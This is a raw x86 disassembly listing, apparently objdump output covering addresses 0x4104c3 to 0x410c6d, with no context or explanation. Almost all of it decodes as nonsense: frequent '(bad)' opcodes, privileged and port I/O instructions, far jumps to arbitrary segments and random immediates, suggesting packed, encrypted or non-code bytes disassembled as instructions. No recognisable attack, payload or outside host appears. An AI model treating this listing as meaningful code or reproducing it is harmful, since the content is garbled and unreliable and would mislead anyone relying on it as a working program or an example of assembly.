  4104c3:	and    edx,DWORD PTR [ebx-0x28]
  4104c6:	daa    
  4104c7:	sub    bh,cl
  4104c9:	test   eax,0x19b27d82
  4104ce:	sti    
  4104cf:	inc    ebx
  4104d0:	inc    ecx
  4104d1:	jne    0x410475
  4104d3:	int    0x18
  4104d5:	popa   
  4104d6:	repz (bad) 
  4104d8:	push   esp
  4104d9:	(bad)  
  4104da:	rcl    BYTE PTR [ebx-0x51],cl
  4104dd:	adc    BYTE PTR [edx],bl
  4104df:	pop    ss
  4104e0:	imul   eax,ebp,0xf51ad31
  4104e6:	fdivr  st,st(0)
  4104e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e9:	mov    al,0x2d
  4104eb:	sub    DWORD PTR [edx],ebx
  4104ed:	cdq    
  4104ee:	dec    ecx
  4104ef:	pop    ecx
  4104f0:	mov    eax,0x9e08fa5e
  4104f5:	add    edx,DWORD PTR [eax+esi*1+0x4c3cd482]
  4104fc:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4104fe:	cld    
  4104ff:	lahf   
  410500:	push   edi
  410501:	inc    esp
  410502:	push   0xf6bbded
  410507:	shr    BYTE PTR [eax+edi*8-0x5c],cl
  41050b:	imul   esi,DWORD PTR [eax-0x5f],0xffffffcd
  41050f:	sahf   
  410510:	adc    dh,BYTE PTR [edi+0x90b804b]
  410516:	push   ss
  410517:	ja     0x410505
  410519:	arpl   WORD PTR [ebx+ecx*4+0x38],di
  41051d:	xor    dh,BYTE PTR [ebp+0x1f0b58b1]
  410523:	or     DWORD PTR [ecx+ebp*8-0x72592051],ebp
  41052a:	mov    bh,0x98
  41052c:	jge    0x410554
  41052e:	cmp    ebx,edx
  410530:	and    dh,BYTE PTR [esi]
  410532:	call   0x11624638
  410537:	mov    ds:0x33bd5a12,ax
  41053d:	repz cmc 
  41053f:	cmp    si,WORD PTR [edx+ecx*2-0x38]
  410544:	add    ch,BYTE PTR [eax]
  410546:	or     ebx,edi
  410548:	addr16 ret 
  41054a:	retf   0xee20
  41054d:	daa    
  41054e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41054f:	(bad)  
  410550:	fld    QWORD PTR [ebp+0x128e3eb2]
  410556:	xchg   ecx,eax
  410557:	xor    dl,BYTE PTR [ebp-0x3cd7a711]
  41055d:	es jae 0x410584
  410560:	jns    0x410559
  410562:	dec    edx
  410563:	fwait
  410564:	cmp    BYTE PTR [edx+0xfcdce2f],0xaf
  41056b:	xlat   BYTE PTR ds:[ebx]
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    ch,0xae
  410585:	ja     0x410562
  410587:	cmp    DWORD PTR [ebx+0x78],edx
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x4105a6
  410590:	cmp    al,BYTE PTR [ebp-0x6d0bb4e7]
  410596:	pop    ecx
  410597:	jmp    DWORD PTR ds:0xab60100b
  41059d:	or     BYTE PTR [esi+esi*4+0x329c6b5e],ah
  4105a4:	(bad)  
  4105a5:	ret    
  4105a6:	in     eax,0x21
  4105a8:	test   BYTE PTR [edi-0x29],dl
  4105ab:	adc    al,0x7b
  4105ad:	push   eax
  4105ae:	repz sbb DWORD PTR [esi+0x2119aae5],0xf796fcc9
  4105b9:	mov    es,WORD PTR [eax+0x15]
  4105bc:	shl    bl,1
  4105be:	cwde   
  4105bf:	ror    DWORD PTR [ebx+0x508719b9],cl
  4105c5:	(bad)  
  4105c6:	xor    al,0x27
  4105c8:	cmp    dh,BYTE PTR [ebx]
  4105ca:	clts   
  4105cc:	out    dx,eax
  4105cd:	int    0xb7
  4105cf:	ret    
  4105d0:	in     al,0xa2
  4105d2:	xor    eax,0x2cc69b00
  4105d7:	sbb    eax,0x5857cadc
  4105dc:	push   ebp
  4105dd:	out    0xb3,eax
  4105df:	sbb    al,0x9f
  4105e1:	pop    es
  4105e2:	sub    ebp,esi
  4105e4:	push   es
  4105e5:	pop    ebp
  4105e6:	ins    BYTE PTR es:[edi],dx
  4105e7:	xchg   DWORD PTR gs:[eax],ebp
  4105ea:	mov    ebx,0xa199cc68
  4105ef:	xor    BYTE PTR [ebx+0x2c],ch
  4105f2:	idiv   DWORD PTR [edx]
  4105f4:	mov    DWORD PTR [eax],esi
  4105f6:	rcl    BYTE PTR [ecx-0x3ec11fe6],cl
  4105fc:	lods   al,BYTE PTR ds:[esi]
  4105fd:	(bad)  ds:0x91b9971f
  410603:	aaa    
  410604:	sar    dh,0xae
  410607:	pop    esi
  410608:	jecxz  0x410621
  41060a:	scas   al,BYTE PTR es:[edi]
  41060b:	adc    eax,0x7d1defb8
  410610:	in     eax,0x8d
  410612:	pop    ecx
  410613:	ret    0x7aec
  410616:	iret   
  410617:	rcl    ebx,1
  410619:	int    0x18
  41061b:	push   0x2b
  41061d:	jbe    0x41069c
  41061f:	outs   dx,DWORD PTR ds:[esi]
  410620:	mov    ds:0x1eba5759,eax
  410625:	sbb    ebx,edx
  410627:	mov    ah,0xa4
  410629:	inc    ebp
  41062a:	pop    ss
  41062b:	mov    ecx,0x87497e06
  410630:	inc    ebx
  410631:	int    0x69
  410633:	dec    edx
  410634:	enter  0xfda9,0xc4
  410638:	jne    0x4105e0
  41063a:	js     0x4106ab
  41063c:	retf   
  41063d:	dec    ebx
  41063e:	test   al,bh
  410640:	pop    ebp
  410641:	mov    ebx,0x9074e679
  410646:	mov    ah,0xaf
  410648:	adc    esi,edx
  41064a:	test   DWORD PTR [eax-0x751377bd],edx
  410650:	(bad)  
  410651:	cmp    al,cl
  410653:	mov    esp,0x53ee8798
  410658:	(bad)  
  41065a:	sbb    al,0x3
  41065c:	test   al,0xcc
  41065e:	cmp    al,0x44
  410660:	pop    es
  410661:	dec    edx
  410662:	daa    
  410663:	icebp  
  410664:	jnp    0x4106b1
  410666:	mov    dh,0xbd
  410668:	in     eax,0x6
  41066a:	lock jp 0x41065e
  41066d:	inc    edx
  41066e:	fistp  QWORD PTR [edx+0x5b]
  410671:	adc    al,0x69
  410673:	int    0x9f
  410675:	inc    eax
  410676:	sub    edx,eax
  410678:	inc    ecx
  410679:	sbb    eax,0xfdec350
  41067e:	cmp    ebp,DWORD PTR [edx+0x166ba622]
  410684:	xchg   edi,eax
  410685:	cmp    al,0x2a
  410687:	les    edi,FWORD PTR [ebp+0x6407cf9a]
  41068d:	stc    
  41068e:	mov    dl,0xea
  410690:	dec    esi
  410691:	ja     0x41067e
  410693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410694:	lahf   
  410695:	das    
  410696:	lods   eax,DWORD PTR ds:[esi]
  410697:	in     eax,dx
  410698:	call   0x2b0b:0x34f9691f
  41069f:	arpl   WORD PTR [esi+eiz*8],cx
  4106a2:	adc    cl,bh
  4106a4:	inc    eax
  4106a5:	ins    BYTE PTR es:[edi],dx
  4106a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106a7:	test   BYTE PTR [edi+ebp*2-0x600743ef],cl
  4106ae:	xchg   esp,eax
  4106af:	jecxz  0x4106ad
  4106b1:	stos   DWORD PTR es:[edi],eax
  4106b2:	xor    eax,0x2ce43600
  4106b7:	add    bl,BYTE PTR [edi+0x17b7c69]
  4106bd:	adc    BYTE PTR [eax],0x4
  4106c0:	add    bh,BYTE PTR [edx+eiz*8]
  4106c3:	fstp   QWORD PTR [ebx]
  4106c5:	xchg   ebp,eax
  4106c6:	pop    edx
  4106c7:	imul   BYTE PTR [esi-0x2a]
  4106ca:	in     al,0x17
  4106cc:	(bad)  
  4106cd:	(bad)  [edi+0x1a]
  4106d0:	cmp    BYTE PTR [ebx+0x7c],dh
  4106d3:	pop    ebp
  4106d4:	pushf  
  4106d5:	sbb    dh,dl
  4106d7:	mov    ds:0xae37a911,al
  4106dc:	jno    0x4106f3
  4106de:	jmp    0x7b3a:0xe99225f7
  4106e5:	jg     0x4106b8
  4106e7:	nop
  4106e8:	push   ebx
  4106e9:	inc    eax
  4106ea:	or     esi,ebx
  4106ec:	test   eax,0x3e5e4926
  4106f1:	xor    BYTE PTR [eax],dh
  4106f3:	and    dh,BYTE PTR [edi-0x6e]
  4106f6:	dec    esi
  4106f7:	pop    es
  4106f8:	mov    al,ds:0xc18cdd21
  4106fd:	fstp   DWORD PTR [ebx+0x62]
  410700:	add    BYTE PTR [ebp+eiz*4+0x128294b0],dh
  410707:	repz or dl,ch
  41070a:	nop
  41070b:	outs   dx,BYTE PTR ds:[esi]
  41070c:	out    dx,eax
  41070d:	inc    edx
  41070e:	aas    
  41070f:	jecxz  0x410725
  410711:	adc    esi,DWORD PTR [edx]
  410713:	dec    ebx
  410714:	or     ecx,edx
  410716:	aam    0x72
  410718:	cli    
  410719:	sub    BYTE PTR [edi+0x124db5a8],bl
  41071f:	es jnp 0x4106c0
  410722:	pop    edx
  410723:	repnz mov ebp,DWORD PTR [edi]
  410726:	stos   BYTE PTR es:[edi],al
  410727:	cs push 0xbab8352f
  41072d:	mov    bh,0xf
  41072f:	daa    
  410730:	mov    esp,0x6ca4bdf2
  410735:	repnz cmp BYTE PTR [edi+ebp*8-0x7f],bh
  41073a:	loope  0x410737
  41073c:	push   edx
  41073d:	pop    es
  41073e:	sub    dh,bl
  410740:	ss push ss
  410742:	dec    edx
  410743:	xchg   esp,eax
  410744:	in     eax,dx
  410745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410746:	ss xchg ebx,eax
  410748:	mov    edi,0x4e077a2e
  41074d:	mov    eax,0x7d7d5d87
  410752:	sbb    ecx,DWORD PTR [esi+ebx*1]
  410755:	inc    edx
  410756:	sub    eax,0xa417b582
  41075b:	mov    edi,0x8877303c
  410760:	pop    es
  410761:	pop    edx
  410762:	shr    BYTE PTR [eax+edx*1+0x306de0ce],cl
  410769:	and    eax,0xe3c7e41e
  41076e:	push   0xa4e6f004
  410773:	scas   al,BYTE PTR es:[edi]
  410774:	add    bl,al
  410776:	jle    0x4107d7
  410778:	sub    eax,0x7f5481c
  41077d:	les    edi,FWORD PTR [eax-0x57]
  410780:	stos   BYTE PTR es:[edi],al
  410781:	pmaddwd mm6,QWORD PTR [ebx-0x2]
  410785:	xchg   DWORD PTR [edx+0x63],edx
  410788:	dec    ecx
  410789:	test   dh,0xd0
  41078c:	push   esp
  41078d:	dec    esp
  41078f:	jae    0x4107eb
  410791:	xchg   ecx,eax
  410792:	adc    BYTE PTR [edx+eax*8+0x1723f980],bl
  410799:	push   es
  41079a:	in     eax,0x63
  41079c:	mul    DWORD PTR ds:0x2faaa706
  4107a2:	test   DWORD PTR [eax],edx
  4107a4:	push   es
  4107a5:	pop    esp
  4107a6:	add    al,0x84
  4107a8:	lods   eax,DWORD PTR ss:[esi]
  4107aa:	cs (bad) 
  4107ac:	(bad)  [ebx]
  4107ae:	(bad)  
  4107af:	std    
  4107b0:	je     0x4107bc
  4107b2:	sub    esi,esp
  4107b4:	imul   esp,eax,0xfffffff8
  4107b7:	das    
  4107b8:	jno    0x41079e
  4107ba:	pop    ebp
  4107bb:	std    
  4107bc:	push   es
  4107bd:	fiadd  DWORD PTR [edx-0x5e]
  4107c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c2:	cmp    eax,0xb49efd6f
  4107c7:	sbb    eax,0x9e0c89f
  4107cc:	cmc    
  4107cd:	pop    ebp
  4107ce:	pop    ebp
  4107cf:	mov    bh,0x77
  4107d1:	adc    eax,0x25fa0b48
  4107d6:	and    eax,DWORD PTR [edx+0x76aba14c]
  4107dc:	pop    esp
  4107dd:	nop
  4107de:	cdq    
  4107df:	pop    edi
  4107e0:	pop    ebx
  4107e1:	daa    
  4107e2:	cmp    eax,0x4aedbc47
  4107e7:	mov    ch,0x20
  4107e9:	outs   dx,BYTE PTR ds:[esi]
  4107ea:	in     eax,0xdb
  4107ec:	jno    0x4107cc
  4107ee:	push   0x3c
  4107f0:	push   ss
  4107f1:	or     BYTE PTR [ecx+0x56085382],dl
  4107f7:	stos   DWORD PTR es:[edi],eax
  4107f8:	loopne 0x410835
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	gs push bp
  410812:	jle    0x4107ba
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	(bad)  
  41081c:	outs   dx,BYTE PTR ds:[esi]
  41081d:	adc    edx,edx
  41081f:	bound  edx,QWORD PTR [edi+0x2e9f3f36]
  410825:	or     esi,DWORD PTR [esi+0x3fc98a41]
  41082b:	(bad)  
  41082c:	pushf  
  41082d:	aad    0x77
  41082f:	pop    esi
  410830:	cmp    BYTE PTR [ebx],al
  410832:	leave  
  410833:	sti    
  410834:	not    BYTE PTR [ecx+0x572c9723]
  41083a:	sbb    ah,BYTE PTR ss:[edx+edx*1]
  41083e:	inc    edi
  41083f:	sahf   
  410840:	popa   
  410841:	shr    DWORD PTR [esi+0x283ebe7],cl
  410847:	lahf   
  410848:	ins    BYTE PTR es:[edi],dx
  410849:	dec    edi
  41084a:	lock (bad) 
  41084c:	icebp  
  41084d:	mov    esi,0x82a8d9df
  410852:	jno    0x410868
  410854:	or     DWORD PTR [esp+edx*2+0x7d],esi
  410858:	and    DWORD PTR [ecx-0x7db1b00e],ecx
  41085e:	dec    esi
  41085f:	sti    
  410860:	mov    esi,0xb2323506
  410865:	loop   0x4108de
  410867:	fistp  WORD PTR [edx-0x567932d3]
  41086d:	push   edx
  41086e:	add    al,0x3c
  410870:	ffree  st(3)
  410872:	add    eax,0x53148312
  410877:	or     BYTE PTR [ebx+0xbdfda],bh
  41087d:	shl    DWORD PTR [ebx+ecx*4],0x6d
  410881:	in     eax,dx
  410882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410883:	mov    ch,0x9
  410885:	jae    0x410902
  410887:	xor    al,0x6b
  410889:	push   0x6625f1b0
  41088e:	mov    BYTE PTR ds:0x8fb14880,bh
  410894:	into   
  410895:	or     DWORD PTR [esi],edi
  410897:	xor    eax,0xd2cca532
  41089c:	add    ah,BYTE PTR [ecx+edi*2-0x216ab99b]
  4108a3:	push   ds
  4108a4:	fistp  WORD PTR [edi]
  4108a6:	out    dx,al
  4108a7:	xchg   esi,eax
  4108a8:	push   esi
  4108a9:	pop    ds
  4108aa:	push   edx
  4108ab:	arpl   si,cx
  4108ad:	into   
  4108ae:	fs xchg edx,eax
  4108b0:	ret    0x6c16
  4108b3:	dec    edi
  4108b4:	nop
  4108b5:	out    0x71,al
  4108b7:	ins    BYTE PTR es:[edi],dx
  4108b8:	and    edx,DWORD PTR [esi+0x4]
  4108bb:	(bad)  
  4108bd:	leave  
  4108be:	mov    ch,0x47
  4108c0:	int3   
  4108c1:	aam    0x2c
  4108c3:	pop    ds
  4108c4:	inc    eax
  4108c5:	ins    DWORD PTR es:[edi],dx
  4108c6:	cs ins DWORD PTR es:[edi],dx
  4108c8:	xchg   esi,eax
  4108c9:	and    al,0xcd
  4108cb:	rcl    DWORD PTR [ecx-0x42],cl
  4108ce:	idiv   BYTE PTR [edx]
  4108d0:	sub    DWORD PTR [edi+0x3c4ead4],esi
  4108d6:	rol    eax,0xd3
  4108d9:	iret   
  4108da:	ficomp DWORD PTR [esi]
  4108dc:	sbb    BYTE PTR [edx-0x76],dh
  4108df:	add    eax,0xf27b0878
  4108e4:	jmp    0x3e60c3a5
  4108e9:	push   edi
  4108ea:	push   cs
  4108eb:	jns    0x41095f
  4108ed:	xor    BYTE PTR [ebp-0x5d],cl
  4108f0:	es in  eax,0x97
  4108f3:	xchg   esi,eax
  4108f4:	sbb    cl,BYTE PTR [esp+edi*8]
  4108f7:	pop    esi
  4108f8:	jne    0x410915
  4108fa:	sub    BYTE PTR [ebp-0x2],ch
  4108fd:	mov    ds:0x4042fe34,eax
  410902:	mov    al,ds:0x6029ee28
  410907:	pop    ebx
  410908:	cmp    BYTE PTR [ebp-0x50203f0a],dl
  41090e:	and    edx,DWORD PTR [ebx+0xa2ba8c1]
  410914:	dec    ebx
  410915:	test   edi,0x1d45bf0a
  41091b:	inc    ebx
  41091c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091d:	push   ss
  41091e:	cmp    ch,BYTE PTR [esi]
  410920:	xlat   BYTE PTR ds:[ebx]
  410921:	leave  
  410922:	sbb    eax,0x943eb9e
  410927:	push   ecx
  410928:	xchg   ebx,eax
  410929:	sahf   
  41092a:	mov    dh,0x8
  41092c:	xor    al,0xa
  41092e:	sbb    al,0xb7
  410930:	lock popa 
  410932:	or     BYTE PTR [edx-0x46487719],al
  410938:	sbb    dl,BYTE PTR [edi+0x1d909999]
  41093e:	xor    al,0x17
  410940:	push   eax
  410941:	or     dl,ch
  410943:	int3   
  410944:	mov    bl,0x9f
  410946:	and    BYTE PTR [edx+0x4b],bh
  410949:	dec    ecx
  41094a:	int3   
  41094b:	mov    ah,0xfe
  41094d:	inc    esi
  41094e:	hlt    
  41094f:	add    eax,0x86ef8bf0
  410954:	push   0xffffff95
  410956:	cwde   
  410957:	cmp    DWORD PTR [ebp-0x28],0x7f25898d
  41095e:	pop    ebp
  41095f:	xor    ah,dh
  410961:	fdiv   QWORD PTR [esi-0x162a4ab8]
  410967:	fstp   DWORD PTR [ebx]
  410969:	adc    bl,BYTE PTR [esi+0x1a]
  41096c:	lahf   
  41096d:	push   ebp
  41096e:	jle    0x410909
  410970:	push   ecx
  410971:	mov    ebp,0x96dad883
  410976:	(bad)  
  410977:	jecxz  0x410947
  410979:	js     0x410967
  41097b:	or     eax,0x98b774d1
  410980:	bnd ret 0xae57
  410984:	jae    0x410977
  410986:	or     esi,ebx
  410988:	pop    edi
  410989:	adc    cl,al
  41098b:	shl    ebp,0xc0
  41098e:	or     al,0x95
  410990:	jmp    0x41091a
  410992:	cmc    
  410993:	fidivr DWORD PTR ds:0x3cc2153b
  410999:	stos   BYTE PTR es:[edi],al
  41099a:	push   ebx
  41099b:	pop    ds
  41099c:	dec    edx
  41099d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41099e:	ret    
  41099f:	les    esp,FWORD PTR [esi]
  4109a1:	dec    esi
  4109a2:	push   ebp
  4109a3:	ins    DWORD PTR es:[edi],dx
  4109a4:	aaa    
  4109a5:	or     cl,dl
  4109a7:	cwde   
  4109a8:	push   edx
  4109a9:	mov    dl,0x7b
  4109ab:	dec    esi
  4109ac:	cs iret 
  4109ae:	jmp    0xb846dac3
  4109b3:	and    cl,BYTE PTR [ebx+edi*2+0x38]
  4109b7:	add    edi,edi
  4109b9:	cmp    eax,DWORD PTR [ebx-0x13cf9680]
  4109bf:	loope  0x410a3d
  4109c1:	je     0x4109dc
  4109c3:	mov    edi,0xc4d07721
  4109c8:	sar    eax,1
  4109ca:	fstp   QWORD PTR [ebx]
  4109cc:	sub    bh,dl
  4109ce:	mov    edi,DWORD PTR [edi+0x62873108]
  4109d4:	fucom  st(6)
  4109d6:	shl    BYTE PTR [ecx],1
  4109d8:	test   BYTE PTR [ebp+0x5514711e],dl
  4109de:	mov    cl,BYTE PTR [eax+0x7]
  4109e1:	clc    
  4109e2:	mov    BYTE PTR [edx+eiz*1+0x41],ch
  4109e6:	xlat   BYTE PTR ds:[ebx]
  4109e7:	mov    ch,0xae
  4109e9:	retf   0xedd8
  4109ec:	popf   
  4109ed:	retf   
  4109ee:	ins    DWORD PTR es:[edi],dx
  4109ef:	dec    ecx
  4109f0:	and    ch,BYTE PTR [ebx-0x4fd547dc]
  4109f6:	pushf  
  4109f7:	jb     0x410a0c
  4109f9:	add    al,0x4f
  4109fb:	test   esp,edx
  4109fd:	pop    ss
  4109fe:	addr16 jmp 0xf7b9:0x6a780350
  410a06:	ret    0x6017
  410a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a0a:	shl    BYTE PTR [ecx],cl
  410a0c:	lods   eax,DWORD PTR ds:[esi]
  410a0d:	loope  0x410a05
  410a0f:	inc    ebp
  410a10:	sbb    ebx,ebp
  410a12:	dec    ebp
  410a13:	xor    al,0xe
  410a15:	test   BYTE PTR [ebx-0x2e],ah
  410a18:	inc    edx
  410a19:	pusha  
  410a1a:	lods   eax,DWORD PTR ds:[esi]
  410a1b:	dec    ebx
  410a1c:	(bad)  
  410a1d:	sbb    eax,0xf0ef407b
  410a22:	call   0x3c7d8bbb
  410a27:	div    DWORD PTR [ebx]
  410a29:	jae    0x4109cf
  410a2b:	or     eax,0xde6a343e
  410a30:	adc    al,BYTE PTR [ebx+esi*8+0x61071350]
  410a37:	fdivr  QWORD PTR [eax-0x30]
  410a3a:	(bad)  
  410a3b:	pushf  
  410a3c:	pop    ebx
  410a3d:	scas   al,BYTE PTR es:[edi]
  410a3e:	cwde   
  410a3f:	lahf   
  410a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a41:	push   0x3
  410a43:	add    al,0xb2
  410a45:	sbb    eax,0xaf2338b1
  410a4a:	lea    eax,[edi-0x38]
  410a4d:	mov    ch,0xce
  410a4f:	pop    esi
  410a50:	cwde   
  410a51:	in     eax,dx
  410a52:	clc    
  410a53:	or     ch,BYTE PTR [esp+ecx*8-0x3440c5c8]
  410a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a5b:	das    
  410a5c:	mov    edx,0xef5bf416
  410a61:	and    bh,BYTE PTR [ebx+eax*1-0x38fde558]
  410a68:	dec    esp
  410a69:	xchg   ebp,eax
  410a6a:	push   0x44
  410a6c:	sbb    esi,DWORD PTR [eax]
  410a6e:	adc    cl,bh
  410a70:	clc    
  410a71:	out    0xab,al
  410a73:	cld    
  410a74:	or     ecx,DWORD PTR [esi]
  410a76:	jge    0x410a89
  410a78:	mov    dh,0x5d
  410a7a:	adc    al,0x7b
  410a7c:	pop    esp
  410a7d:	sti    
  410a7e:	(bad)  
  410a7f:	clc    
  410a80:	fiadd  WORD PTR [edi+0x78221ed6]
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	test   DWORD PTR [edx+0x52],0x56137e04
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	or     al,0x68
  410abd:	sbb    edi,DWORD PTR [ebx+0x51fbeaee]
  410ac3:	sbb    DWORD PTR [edi-0x42be4581],ebx
  410ac9:	aad    0x2c
  410acb:	inc    ebp
  410acc:	jp     0x410b27
  410ace:	inc    eax
  410acf:	les    ecx,FWORD PTR [ebp-0x430408d]
  410ad5:	pop    es
  410ad6:	fcomp  QWORD PTR [ebp-0x5f]
  410ad9:	lea    esi,[esi]
  410adb:	push   edx
  410adc:	cmp    eax,0xde70a516
  410ae1:	pushf  
  410ae2:	jp     0x410b2d
  410ae4:	div    DWORD PTR [ebx-0x69]
  410ae7:	fdivr  st,st(3)
  410ae9:	add    al,0x5d
  410aeb:	inc    ecx
  410aec:	jmp    0x7accb641
  410af1:	jns    0x410b09
  410af3:	or     BYTE PTR [eax],bh
  410af5:	cmp    al,0xa
  410af7:	clc    
  410af8:	cmovg  edx,DWORD PTR [eax-0x77286a95]
  410aff:	rol    BYTE PTR [edx-0x27],1
  410b02:	retf   0x8bac
  410b05:	int3   
  410b06:	int3   
  410b07:	and    BYTE PTR [edx],ah
  410b09:	les    ebx,FWORD PTR ds:0x7b825112
  410b0f:	es mov dl,0xd1
  410b12:	int3   
  410b13:	(bad)
  410b16:	jmp    0x13c5:0x12512079
  410b1d:	sub    ebp,DWORD PTR [esi]
  410b1f:	mov    esi,0xd6d02201
  410b24:	cmp    BYTE PTR [ecx-0x53],bh
  410b27:	in     al,dx
  410b28:	(bad)  
  410b29:	in     al,0x4e
  410b2b:	out    0xae,eax
  410b2d:	cmp    BYTE PTR [ebx],cl
  410b2f:	xchg   ecx,eax
  410b30:	cmp    ah,BYTE PTR [ebp+0x39]
  410b33:	cmp    al,0xe8
  410b35:	sbb    BYTE PTR [edx+edi*4-0x29e6bd26],al
  410b3c:	(bad)  
  410b3d:	scas   eax,DWORD PTR es:[edi]
  410b3e:	push   edx
  410b3f:	shl    DWORD PTR [ebx-0x25],0x92
  410b43:	dec    esi
  410b44:	mov    cl,0x5e
  410b46:	push   ss
  410b47:	pop    es
  410b48:	xchg   esi,eax
  410b49:	pop    edx
  410b4a:	mov    dh,0x1f
  410b4c:	loope  0x410b22
  410b4e:	test   BYTE PTR [eax+0x0],dl
  410b51:	dec    ebx
  410b52:	int3   
  410b53:	xor    eax,0xc8a3338d
  410b58:	mov    esi,0x39eb2c7c
  410b5d:	jmp    0x54f8:0xa3e295d4
  410b64:	push   esp
  410b65:	aam    0x7c
  410b67:	scas   eax,DWORD PTR es:[edi]
  410b68:	xchg   esp,eax
  410b69:	out    dx,eax
  410b6a:	add    al,0x10
  410b6c:	sbb    eax,0x55e88af9
  410b71:	(bad)  
  410b72:	mov    bl,0x83
  410b74:	add    eax,0xb854f7b0
  410b79:	sbb    BYTE PTR [eax+0x73be8c82],dh
  410b7f:	jecxz  0x410b3d
  410b81:	cmp    ecx,DWORD PTR [esi+ebx*8+0x44]
  410b85:	sub    ecx,ebx
  410b87:	pop    edi
  410b88:	push   0xffffffce
  410b8a:	xchg   edi,eax
  410b8b:	push   ecx
  410b8c:	mov    ebp,DWORD PTR [ebx]
  410b8e:	inc    edi
  410b8f:	sub    cl,al
  410b91:	rol    BYTE PTR [ebx],cl
  410b93:	and    bh,0x8c
  410b96:	pop    ecx
  410b97:	adc    dh,al
  410b99:	rcr    DWORD PTR [edi+ebx*2-0x46e153b6],1
  410ba0:	push   ss
  410ba1:	test   esp,ecx
  410ba3:	fst    DWORD PTR [esp+ebx*2-0x41b5f985]
  410baa:	and    bl,bh
  410bac:	retf   
  410bad:	jne    0x410b86
  410baf:	mov    al,0xa7
  410bb1:	jne    0x410b47
  410bb3:	mov    BYTE PTR [ebx],bl
  410bb5:	mov    ebx,0xf5ab3bd5
  410bba:	cmp    eax,DWORD PTR [ebp+0x74d6d578]
  410bc0:	jmp    0xc9595d20
  410bc5:	scas   al,BYTE PTR es:[edi]
  410bc6:	out    0x6d,al
  410bc8:	pop    eax
  410bc9:	sbb    edi,DWORD PTR [ecx-0x30]
  410bcc:	pop    ss
  410bcd:	in     eax,dx
  410bce:	cmp    DWORD PTR [eax-0x5997041e],0x6a
  410bd5:	fstp   st(4)
  410bd7:	dec    esi
  410bd8:	cmp    eax,0xc019649f
  410bdd:	mov    bh,0xd8
  410bdf:	popf   
  410be0:	add    bh,BYTE PTR [edi+ebx*1+0x25e45e9f]
  410be7:	test   al,0x2a
  410be9:	xor    BYTE PTR [edx-0x2a],ah
  410bec:	or     DWORD PTR [ebp+0xc],ecx
  410bef:	xor    BYTE PTR [ebp+0xa],ah
  410bf2:	mov    cx,WORD PTR [ebx]
  410bf5:	imul   esp,DWORD PTR [eax-0x63f25e9d],0xffffffaa
  410bfc:	mov    ecx,0x8316223a
  410c01:	popa   
  410c02:	ret    
  410c03:	das    
  410c04:	inc    esp
  410c05:	and    al,0x68
  410c07:	ins    BYTE PTR es:[edi],dx
  410c08:	sahf   
  410c09:	fs inc edx
  410c0b:	cmp    BYTE PTR [ecx+0x76492ef6],bl
  410c11:	shl    dh,0x79
  410c14:	inc    ecx
  410c15:	push   ebp
  410c16:	sahf   
  410c17:	loopne 0x410c61
  410c19:	(bad)  
  410c1a:	dec    edi
  410c1b:	dec    edx
  410c1c:	outs   dx,DWORD PTR ds:[esi]
  410c1d:	mov    esp,eax
  410c1f:	inc    esp
  410c20:	mov    bl,BYTE PTR [edx-0x62]
  410c23:	aam    0xef
  410c25:	stos   DWORD PTR es:[edi],eax
  410c26:	mov    ch,0x9f
  410c28:	pop    edx
  410c29:	adc    al,al
  410c2b:	aaa    
  410c2c:	lods   eax,DWORD PTR ds:[esi]
  410c2d:	sub    bl,dh
  410c2f:	xor    DWORD PTR [ecx+0x72],ebx
  410c32:	mov    DWORD PTR ds:0xc0872050,ecx
  410c38:	stc    
  410c39:	xor    ah,BYTE PTR [ebx+0x6be3f03d]
  410c3f:	lahf   
  410c40:	add    DWORD PTR [eax],0xb5de0224
  410c46:	mov    ebp,0x5f805c9f
  410c4b:	mov    al,0xfa
  410c4d:	mov    bh,0xff
  410c4f:	fsubr  DWORD PTR fs:[ebx]
  410c52:	call   eax
  410c54:	inc    esp
  410c55:	xor    DWORD PTR [edx-0x6c33fa25],esp
  410c5b:	lods   al,BYTE PTR ds:[esi]
  410c5c:	mov    cs,WORD PTR [ebp+0x4b833a1f]
  410c62:	inc    eax
  410c63:	jo     0x410c14
  410c65:	(bad)  
  410c66:	(bad)  
  410c67:	hlt    
  410c68:	add    eax,0xf6a1f722
  410c6d:	inc    edi
